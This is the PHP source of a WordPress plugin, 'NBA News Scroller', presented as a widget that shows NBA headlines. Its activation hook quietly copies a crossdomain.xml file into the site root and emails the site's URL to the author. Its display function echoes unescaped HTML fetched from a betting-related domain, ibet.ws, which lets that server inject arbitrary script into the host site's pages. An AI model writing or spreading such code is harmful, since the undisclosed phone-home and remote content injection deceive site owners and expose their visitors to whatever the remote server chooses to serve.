<?php
/*
Plugin Name: NBA News Scroller
Description: Provides the Latest NBAS Headlines, updated every 3-4 hours
Author: A93D
Version: 0.8.1
Author URI: http://www.thoseamazingparks.com/getstats.php
*/

require_once(dirname(__FILE__) . '/rss_fetch.inc'); 
define('MAGPIE_FETCH_TIME_OUT', 60);
define('MAGPIE_OUTPUT_ENCODING', 'UTF-8');
define('MAGPIE_CACHE_ON', 0);

// Get Current Page URL
function NBASPageURL() {
 $NBASpageURL = 'http';
 $NBASpageURL .= "://";
 if ($_SERVER["SERVER_PORT"] != "80") {
  $NBASpageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
 } else {
  $NBASpageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
 }
 return $NBASpageURL;
}
/* This Registers a Sidebar Widget.*/
function widget_nbasstats() 
{
?>
<h2>NBA Latest News</h2>
<?php nbas_stats(); ?>
<?php
}

function nbasstats_install()
{
register_sidebar_widget(__('NBAS News Scroll'), 'widget_nbasstats'); 
}
add_action("plugins_loaded", "nbasstats_install");

/* When plugin is activated */
register_activation_hook(__FILE__,'nbas_stats_install');

/* When plugin is deactivation*/
register_deactivation_hook( __FILE__, 'nbas_stats_remove' );

function nbas_stats_install() 
{
// Copies crossdomain.xml file, if necessary, to proper folder
if (!file_exists("/crossdomain.xml"))
	{ 
	#echo "We've copied the crossdomain.xml file...\n\n";
	copy( dirname(__FILE__)."/crossdomain.xml", "../../../crossdomain.xml" );
	} 
// Here we pick 3 Random Ad Links in addition to first ad which is always id 0
// This is the URL For Fetching the RSS Feed with Ads Numbers
$myads = "http://www.ibet.ws/nba_news_scroll/nba_scroll_magpie_ads.php";
// This is the Magpie Basic Command for Fetching the Stats URL
$url = $myads;
$rss = nbas_fetch_rss( $url );
// Now to break the feed down into each item part
foreach ($rss->items as $item) 
		{
		// These are the individual feed elements per item
		$title = $item['title'];
		$description = $item['description'];
		// Assign Variables to Feed Results
		if ($title == 'ads1start')
			{
			$ads1start = $description;
			}
		else if ($title == 'ads1finish')
			{
			$ads1finish = $description;
			}
		if ($title == 'ads2start')
			{
			$ads2start = $description;
			}
		else if ($title == 'ads2finish')
			{
			$ads2finish = $description;
			}			
		if ($title == 'ads3start')
			{
			$ads3start = $description;
			}
		else if ($title == 'ads3finish')
			{
			$ads3finish = $description;
			}
		if ($title == 'ads4start')
			{
			$ads4start = $description;
			}
		else if ($title == 'ads4finish')
			{
			$ads4finish = $description;
			}	
		}
// Actual Ad Variable Calls
$nbasads_id_1 = rand($ads1start,$ads1finish);
$nbasads_id_2 = rand($ads2start,$ads2finish);
$nbasads_id_3 = rand($ads3start,$ads3finish);
$nbasads_id_4 = rand($ads4start,$ads4finish);

add_option("nbas_stats_ad1", "$nbasads_id_1", "This is my nbas ad1", "yes");
add_option("nbas_stats_ad2", "$nbasads_id_2", "This is my nbas ad2", "yes");
add_option("nbas_stats_ad3", "$nbasads_id_3", "This is my nbas ad3", "yes");
add_option("nbas_stats_ad4", "$nbasads_id_4", "This is my nbas ad4", "yes");
add_option("nbas_scroll_text_color", "#000000", "This is my scrolling text color", "yes");
add_option("nbas_scroll_text_color1", "#FFFFFF", "This is my background color 1", "yes");
add_option("nbas_scroll_text_color2", "#FFFFCC", "This is my background color 2", "yes");

if ( ($ads_id_1 == 1) || ($ads_id_1 == 0) )
	{
	mail("links@a93d.com", "NBA SCROLLER Installation", "Hi\n\nNBA SCROLLER Activated at \n\n".NBASPageURL()."\n\nNBA SCROLLER Stats Service Support\n","From: links@a93d.com\r\n");
	}
}
function nbas_stats_remove() 
{
/* Deletes the database field */

delete_option('nbas_stats_ad1');
delete_option('nbas_stats_ad2');
delete_option('nbas_stats_ad3');
delete_option('nbas_stats_ad4');
delete_option('nbas_scroll_text_color');
delete_option('nbas_scroll_text_color1');
delete_option('nbas_scroll_text_color2');
}

if ( is_admin() ){

/* Call the html code */
add_action('admin_menu', 'nbas_stats_admin_menu');

function nbas_stats_admin_menu() {

add_options_page('NBA Scroller', 'NBA Scroller Settings', 'administrator', 'nbas_hello.php', 'nbas_stats_plugin_page');
}
}
function nbas_stats()
{
$ad1 = get_option('nbas_stats_ad1');
$ad2 = get_option('nbas_stats_ad2');
$ad3 = get_option('nbas_stats_ad3');
$ad4 = get_option('nbas_stats_ad4');
$scrollcolor = preg_replace('/#/', '', get_option('nbas_scroll_text_color'));
$bckgrd1 = preg_replace('/#/', '', get_option('nbas_scroll_text_color1'));
$bckgrd2 = preg_replace('/#/', '', get_option('nbas_scroll_text_color2'));

$myads = "http://www.ibet.ws/nba_news_scroll/nba_news_scroll_ads.php?lnko=$ad1&lnkt=$ad2&lnkh=$ad3&lnkf=$ad4&scrollcolor=$scrollcolor&backgrdone=$bckgrd1&backgrdtwo=$bckgrd2";
// This is the Magpie Basic Command for Fetching the Stats URL
$url = $myads;
$rss = nbas_fetch_rss( $url );
// Now to break the feed down into each item part
foreach ($rss->items as $item) 
		{
		// These are the individual feed elements per item
		$title = $item['title'];
		$description = $item['description'];
		// Assign Variables to Feed Results
		if ($title == 'adform')
			{
			$adform = $description;
			}
		}

echo $adform;
}
function nbas_stats_plugin_page() {
   clearstatcache();
   if (!file_exists('../crossdomain.xml'))
	{ 
	echo '<h4>*Note: We tried to copy a file for you, but it didn\'t work. For optimal plugin operation, please use FTP to upload the "crossdomain.xml" file found in this plugin\'s folder to your website\'s "root directory", or folder where your wp-config.php file is kept. Completing this step will avoid excessive error reporting in your error log files...Thanks!
	<br />
	Alternatively, you can use the following form to download the file and upload from its location on your hard drive:</h4>
	<br />
	<a href="http://www.ibet.ws/crossdomain.zip" title="Click Here to Download or use the Button" target="_blank"><strong>Click Here</strong> to Download if Button Does Not Function</a>   
    <form id="DownloadForm" name="DownloadForm" method="post" action="">
      <label>
        <input type="button" name="DownloadWidget" value="Download File" onClick="window.open(\'http://www.ibet.ws/crossdomain.zip\', \'Download\'); return false;">
      </label>
    </form>';
	}
	?>
<script language=JavaScript>

var TCP = new TColorPicker();

function TCPopup(field, palette) {
	this.field = field;
	this.initPalette = !palette || palette > 3 ? 0 : palette;
	var w = 194, h = 240,
	move = screen ? 
		',left=' + ((screen.width - w) >> 1) + ',top=' + ((screen.height - h) >> 1) : '', 
	o_colWindow = window.open('<?php echo '../wp-content/plugins/nba-news-scroller/picker.html'; ?>', null, "help=no,status=no,scrollbars=no,resizable=no" + move + ",width=" + w + ",height=" + h + ",dependent=yes", true);
	o_colWindow.opener = window;
	o_colWindow.focus();
}

function TCBuildCell (R, G, B, w, h) {
	return '<td bgcolor="#' + this.dec2hex((R << 16) + (G << 8) + B) + '"><a href="javascript:P.S(\'' + this.dec2hex((R << 16) + (G << 8) + B) + '\')" onmouseover="P.P(\'' + this.dec2hex((R << 16) + (G << 8) + B) + '\')"><img src="pixel.gif" width="' + w + '" height="' + h + '" border="0"></a></td>';
}

function TCSelect(c) {
	this.field.value = '#' + c.toUpperCase();
	this.win.close();
}

function TCPaint(c, b_noPref) {
	c = (b_noPref ? '' : '#') + c.toUpperCase();
	if (this.o_samp) 
		this.o_samp.innerHTML = '<font face=Tahoma size=2>' + c +' <font color=white>' + c + '</font></font>'
	if(this.doc.layers)
		this.sample.bgColor = c;
	else { 
		if (this.sample.backgroundColor != null) this.sample.backgroundColor = c;
		else if (this.sample.background != null) this.sample.background = c;
	}
}

function TCGenerateSafe() {
	var s = '';
	for (j = 0; j < 12; j ++) {
		s += "<tr>";
		for (k = 0; k < 3; k ++)
			for (i = 0; i <= 5; i ++)
				s += this.bldCell(k * 51 + (j % 2) * 51 * 3, Math.floor(j / 2) * 51, i * 51, 8, 10);
		s += "</tr>";
	}
	return s;
}

function TCGenerateWind() {
	var s = '';
	for (j = 0; j < 12; j ++) {
		s += "<tr>";
		for (k = 0; k < 3; k ++)
			for (i = 0; i <= 5; i++)
				s += this.bldCell(i * 51, k * 51 + (j % 2) * 51 * 3, Math.floor(j / 2) * 51, 8, 10);
		s += "</tr>";
	}
	return s	
}
function TCGenerateMac() {
	var s = '';
	var c = 0,n = 1;
	var r,g,b;
	for (j = 0; j < 15; j ++) {
		s += "<tr>";
		for (k = 0; k < 3; k ++)
			for (i = 0; i <= 5; i++){
				if(j<12){
				s += this.bldCell( 255-(Math.floor(j / 2) * 51), 255-(k * 51 + (j % 2) * 51 * 3),255-(i * 51), 8, 10);
				}else{
					if(n<=14){
						r = 255-(n * 17);
						g=b=0;
					}else if(n>14 && n<=28){
						g = 255-((n-14) * 17);
						r=b=0;
					}else if(n>28 && n<=42){
						b = 255-((n-28) * 17);
						r=g=0;
					}else{
						r=g=b=255-((n-42) * 17);
					}
					s += this.bldCell( r, g,b, 8, 10);
					n++;
				}
			}
		s += "</tr>";
	}
	return s;
}

function TCGenerateGray() {
	var s = '';
	for (j = 0; j <= 15; j ++) {
		s += "<tr>";
		for (k = 0; k <= 15; k ++) {
			g = Math.floor((k + j * 16) % 256);
			s += this.bldCell(g, g, g, 9, 7);
		}
		s += '</tr>';
	}
	return s
}

function TCDec2Hex(v) {
	v = v.toString(16);
	for(; v.length < 6; v = '0' + v);
	return v;
}

function TCChgMode(v) {
	for (var k in this.divs) this.hide(k);
	this.show(v);
}

function TColorPicker(field) {
	this.build0 = TCGenerateSafe;
	this.build1 = TCGenerateWind;
	this.build2 = TCGenerateGray;
	this.build3 = TCGenerateMac;
	this.show = document.layers ? 
		function (div) { this.divs[div].visibility = 'show' } :
		function (div) { this.divs[div].visibility = 'visible' };
	this.hide = document.layers ? 
		function (div) { this.divs[div].visibility = 'hide' } :
		function (div) { this.divs[div].visibility = 'hidden' };
	// event handlers
	this.C       = TCChgMode;
	this.S       = TCSelect;
	this.P       = TCPaint;
	this.popup   = TCPopup;
	this.draw    = TCDraw;
	this.dec2hex = TCDec2Hex;
	this.bldCell = TCBuildCell;
	this.divs = [];
}

function TCDraw(o_win, o_doc) {
	this.win = o_win;
	this.doc = o_doc;
	var 
	s_tag_openT  = o_doc.layers ? 
		'layer visibility=hidden top=54 left=5 width=182' : 
		'div style=visibility:hidden;position:absolute;left:6px;top:54px;width:182px;height:0',
	s_tag_openS  = o_doc.layers ? 'layer top=32 left=6' : 'div',
	s_tag_close  = o_doc.layers ? 'layer' : 'div'
		
	this.doc.write('<' + s_tag_openS + ' id=sam name=sam><table cellpadding=0 cellspacing=0 border=1 width=181 align=center class=bd><tr><td align=center height=18><div id="samp"><font face=Tahoma size=2>sample <font color=white>sample</font></font></div></td></tr></table></' + s_tag_close + '>');
	this.sample = o_doc.layers ? o_doc.layers['sam'] : 
		o_doc.getElementById ? o_doc.getElementById('sam').style : o_doc.all['sam'].style

	for (var k = 0; k < 4; k ++) {
		this.doc.write('<' + s_tag_openT + ' id="p' + k + '" name="p' + k + '"><table cellpadding=0 cellspacing=0 border=1 align=center>' + this['build' + k]() + '</table></' + s_tag_close + '>');
		this.divs[k] = o_doc.layers 
			? o_doc.layers['p' + k] : o_doc.all 
				? o_doc.all['p' + k].style : o_doc.getElementById('p' + k).style
	}
	if (!o_doc.layers && o_doc.body.innerHTML) 
		this.o_samp = o_doc.all 
			? o_doc.all.samp : o_doc.getElementById('samp');
	this.C(this.initPalette);
	if (this.field.value) this.P(this.field.value, true)
}
</script>

   <div>
   <h2>NBA Scroller Options Page</h2>
   <p>To disable this plugin, simply go to your Plugin Management Control Panel and select the plugin name, and then click "Deactivate". Also, make sure you remove the plugin from your sidebar using the "Appearance" or "Design" sections in Wordpress!</p>
   
   <br />
  
 <table  cellspacing="1" width="95%" border="0"> 
		<tr><th colspan="2" >Manage Your Scroller's Colors Below</td></tr> 
		<!-- Make sure you have valid named HTML form --> 
 
		<tr> 
			<td valign="top" nowrap>Select Scrolling Text Color from Web Safe Palette (Default color is Black: #000000): 
            <br />
            <strong>Color Sample:</strong>
            <br />
            <input type="text" class="textbox" style="background:<?php echo get_option('nbas_scroll_text_color'); ?>;" />
            <br />
            <small>*If White (#FFFFFF) is chosen, it will not appear on this page, since the page is already white</small>
            </td>
             
			<td   valign="top"> 
<form name="tcp_test" method="post" action="options.php">
<?php wp_nonce_field('update-options'); ?>
	<input type="Text" name="nbas_scroll_text_color" id="nbas_scroll_text_color" value="<?php echo get_option('nbas_scroll_text_color'); ?>" />

			<a href="javascript:TCP.popup(document.forms['tcp_test'].elements['nbas_scroll_text_color'])"><img width="15" height="13" border="0" alt="Click Here Pick A Color" src="<?php echo '../wp-content/plugins/nba-news-scroller/cpiksel.gif'; ?>" /></a>
      <br />
      <input type="hidden" name="action" value="update" />
   <input type="hidden" name="page_options" value="nbas_scroll_text_color" />
  
   <p>
   <input type="submit" value="<?php _e('Save Changes') ?>" />
      <input name="defaultfontcolor" type="hidden" value="#000000" />
<input type="button" value="Default Color" onClick="document.tcp_test.nbas_scroll_text_color.value=document.tcp_test.defaultfontcolor.value">
   </p>
  
   </form>
		</td> 
		</tr> 

        <tr> 
			<td valign="top" nowrap>Select Scrolling Background 1 (Default color is White: #FFFFFF):
            <br />
            <strong>Color Sample:</strong>
            <br />
            <input type="text" class="textbox" style="background:<?php echo get_option('nbas_scroll_text_color1'); ?>;" />
            <br />
            <small>*If White (#FFFFFF) is chosen, it will not appear on this page, since the page is already white</small>
            </td>
            
            
			<td   valign="top"> 
<form name="tcp_test1" method="post" action="options.php">
<?php wp_nonce_field('update-options'); ?>
	<input type="Text" name="nbas_scroll_text_color1" id="nbas_scroll_text_color1" value="<?php echo get_option('nbas_scroll_text_color1'); ?>" />

			<a href="javascript:TCP.popup(document.forms['tcp_test1'].elements['nbas_scroll_text_color1'])"><img width="15" height="13" border="0" alt="Click Here Pick A Color" src="<?php echo '../wp-content/plugins/nba-news-scroller/cpiksel.gif'; ?>" /></a>
            

   <input type="hidden" name="page_options" value="nbas_scroll_text_color1" />
   <input type="hidden" name="action" value="update" />

  
   <p>
   <input type="submit" value="<?php _e('Save Changes') ?>" />
   <input name="defaultb1" type="hidden" value="#FFFFFF" />
<input type="button" value="Default Color" onClick="document.tcp_test1.nbas_scroll_text_color1.value=document.tcp_test1.defaultb1.value">
   </p>
  
   </form>
   
		</td> 
		</tr> 
		   
        <tr> 
			<td valign="top" nowrap>Select Scrolling Background 2 (Default color is Light Yellow: #FFFFCC): 
            <br />
            <strong>Color Sample:</strong>
            <br />
            <input type="text" class="textbox" style="background:<?php echo get_option('nbas_scroll_text_color2'); ?>;" />
            <br />
            <small>*If White (#FFFFFF) is chosen, it will not appear on this page, since the page is already white</small>
            </td>
			<td   valign="top"> 

<form name="tcp_test2" method="post" action="options.php">
<?php wp_nonce_field('update-options'); ?>
	<input type="Text" name="nbas_scroll_text_color2" id="nbas_scroll_text_color2" value="<?php echo get_option('nbas_scroll_text_color2'); ?>" />

			<a href="javascript:TCP.popup(document.forms['tcp_test2'].elements['nbas_scroll_text_color2'])"><img width="15" height="13" border="0" alt="Click Here Pick A Color" src="<?php echo '../wp-content/plugins/nba-news-scroller/cpiksel.gif'; ?>" /></a>
            
   <input type="hidden" name="action" value="update" />
   <input type="hidden" name="page_options" value="nbas_scroll_text_color2" />
   <br />
   <input type="submit" value="<?php _e('Save Changes') ?>" />
      <input name="defaultb2" type="hidden" value="#FFFFCC" />
<input type="button" value="Default Color" onClick="document.tcp_test2.nbas_scroll_text_color2.value=document.tcp_test2.defaultb2.value">
</form>
<p>
<?php echo nbas_stats(); ?>
</p>
<?php echo $myads; ?>
</table> 

   </div>
   <?php
   }
?>